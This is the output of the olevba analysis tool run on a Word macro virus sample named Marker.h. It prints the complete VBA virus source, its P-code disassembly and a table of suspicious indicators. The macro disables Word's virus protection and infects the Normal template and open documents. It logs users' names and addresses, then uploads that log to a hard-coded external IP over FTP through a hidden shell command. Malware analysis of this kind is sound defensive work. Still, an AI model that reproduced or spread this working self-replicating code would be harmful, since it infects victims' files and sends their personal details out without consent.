olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
' 2044
'ThisDocument
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'


' 07:26:15  - Sonntag, 26 Dez 1999
' Andreas Marx
'


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11062 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	Dim (Const) 
' 	LitStr 0x0014 "<- this is a marker!"
' 	VarDefn Marker
' Line #5:
' Line #6:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #7:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #9:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #10:
' Line #11:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #14:
' Line #15:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #16:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #17:
' Line #18:
' Line #19:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #21:
' Line #22:
' Line #23:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #24:
' Line #25:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #27:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #29:
' 	EndIfBlock 
' Line #30:
' Line #31:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #32:
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #34:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	LitStr 0x0006 "C:\hsf"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #37:
' Line #38:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #39:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #40:
' 	QuoteRem 0x0000 0x0005 " 2044"
' Line #41:
' 	QuoteRem 0x0000 0x000C "ThisDocument"
' Line #42:
' 	LitStr 0x000D "c:\netldx.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "o 209.201.88.110"
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ascii"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #51:
' Line #52:
' 	LitStr 0x002A "command.com /c ftp.exe -n -s:c:\netldx.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #53:
' Line #54:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #55:
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' Line #59:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #60:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #61:
' Line #62:
' Line #63:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #64:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #65:
' Line #66:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #67:
' Line #68:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #69:
' Line #70:
' Line #71:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #72:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #73:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #74:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #75:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	ElseBlock 
' Line #78:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #81:
' Line #82:
' 	LineCont 0x0010 09 00 0E 00 12 00 15 00 1E 00 0E 00 29 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #83:
' Line #84:
' Line #85:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #86:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #87:
' Line #88:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #89:
' Line #90:
' 	EndIfBlock 
' Line #91:
' Line #92:
' Line #93:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #94:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #95:
' Line #96:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #97:
' Line #98:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #99:
' Line #100:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #101:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #102:
' Line #103:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #104:
' Line #105:
' 	EndIfBlock 
' Line #106:
' Line #107:
' Line #108:
' 	EndIfBlock 
' Line #109:
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #113:
' Line #114:
' 	QuoteRem 0x0000 0x0022 " 09:08:36  - Saturday, 28 Nov 1998"
' Line #115:
' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
' Line #116:
' 	QuoteRem 0x0000 0x000C " Blue Planet"
' Line #117:
' 	QuoteRem 0x0000 0x0000 ""
' Line #118:
' Line #119:
' Line #120:
' 	QuoteRem 0x0000 0x0021 " 07:26:15  - Sonntag, 26 Dez 1999"
' Line #121:
' 	QuoteRem 0x0000 0x000D " Andreas Marx"
' Line #122:
' 	QuoteRem 0x0000 0x0000 ""
' Line #123:
' Line #124:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

